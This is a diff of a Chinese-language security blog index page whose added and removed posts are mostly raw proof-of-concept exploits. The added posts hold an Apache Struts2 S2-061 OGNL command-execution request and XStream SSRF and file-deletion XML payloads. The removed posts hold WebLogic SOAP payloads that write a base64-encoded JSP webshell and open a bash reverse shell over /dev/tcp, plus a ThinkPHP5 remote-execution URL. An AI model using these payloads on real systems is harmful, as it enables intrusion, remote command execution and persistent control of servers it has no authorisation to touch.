@@ -75,6 +75,86 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CVE-2020-17530-S2-061远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-12-20T12:09:00.000Z" itemprop="datePublished">2020-12-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-17530 S2-061远程代码执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p><img src="/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3bq0t0000g4a06apx7oyu" data-title="CVE-2020-17530 S2-061远程代码执行漏洞" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand任意文件删除POC" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/" class="article-date">
+  <time class="dt-published" datetime="2020-12-20T12:06:29.000Z" itemprop="datePublished">2020-12-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/">CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="26258-POC"><a href="#26258-POC" class="headerlink" title="26258-POC"></a>26258-POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&#39;javax.activation.URLDataSource&#39;&gt;</span><br><span class="line">            &lt;url&gt;http:&#x2F;&#x2F;localhost:8080&#x2F;internal&#x2F;:&lt;&#x2F;url&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line">XStream xstream &#x3D; new XStream();</span><br><span class="line">xstream.fromXML(xml);</span><br></pre></td></tr></table></figure>
+<h2 id="26259-POC"><a href="#26259-POC" class="headerlink" title="26259-POC"></a>26259-POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&#39;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#39;&gt;</span><br><span class="line">            &lt;contentType&gt;text&#x2F;plain&lt;&#x2F;contentType&gt;</span><br><span class="line">            &lt;is class&#x3D;&#39;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#39;&gt;</span><br><span class="line">              &lt;tempFile&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;tempFile&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="参看："><a href="#参看：" class="headerlink" title="参看："></a>参看：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;caiqiiqi&#x2F;article&#x2F;details&#x2F;1111948</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/" data-id="ckix3bq130001g4a08c1689xz" data-title="CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-逆向笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/12/20/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -671,91 +751,12 @@
 
 
   
-    <article id="post-CNVD-2019-48814-Weblogic反序列化漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/20/CNVD-2019-48814-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-12-20T10:11:16.000Z" itemprop="datePublished">2020-12-20</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/20/CNVD-2019-48814-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">CNVD-2019-48814 Weblogic反序列化漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>WebLogic 10.* / WebLogic 12.1.3.0</p>
-<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90&#x2F;weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90&#x2F;weblogic12:latest </span><br></pre></td></tr></table></figure>
-<p>访问地址<code>http://localhost:49163/console</code><br>账户密码：weblogic/welcom1<br>访问路径<code>http://192.168.247.129:49163/_async/AsyncResponseService</code>确定此路径对外开放</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_async&#x2F;AsyncResponseService HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.129:49163</span><br><span class="line">Content-Length: 1383</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4&#x3D; |base64 -d &gt; servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;webshell.jsp&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_async&#x2F;AsyncResponseService HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.129:49164</span><br><span class="line">Content-Length: 789</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.247.129&#x2F;12345 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CNVD-2019-48814-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckix2wicc00005ka0ex0g3lci" data-title="CNVD-2019-48814 Weblogic反序列化漏洞" class="article-share-link">Teilen</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CVE-2018-24942-ThinkPHP5远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/20/CVE-2018-24942-ThinkPHP5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-12-20T10:06:41.000Z" itemprop="datePublished">2020-12-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/20/CVE-2018-24942-ThinkPHP5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2018-24942 ThinkPHP5远程代码执行漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击</p>
-<h2 id="二、影响产品"><a href="#二、影响产品" class="headerlink" title="二、影响产品"></a>二、影响产品</h2><p>上海顶想信息科技有限公司 ThinkPHP 5.*，&lt;5.1.31</p>
-<p>上海顶想信息科技有限公司 ThinkPHP &lt;=5.0.23</p>
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>访问镜像地址<br>在其后拼接url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls &#x2F;tmp</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2018-24942-ThinkPHP5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix2wicx00085ka0h9ew9bkw" data-title="CVE-2018-24942 ThinkPHP5远程代码执行漏洞" class="article-share-link">Teilen</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
+  </nav>
 
 </section>
         
@@ -786,6 +787,14 @@
       <ul>
         
           <li>
+            <a href="/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-17530 S2-061远程代码执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/">CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC</a>
+          </li>
+        
+          <li>
             <a href="/2020/12/20/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/">逆向笔记</a>
           </li>
         
@@ -795,14 +804,6 @@
         
           <li>
             <a href="/2020/12/20/CVE-2017-7494-Samba%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-7494 Samba远程命令执行漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/">CVE-2017-5638 Struts2 S2-045远程代码执行漏洞POC</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-4917 Spring WebFlow远程代码执行漏洞</a>
           </li>
         
       </ul>
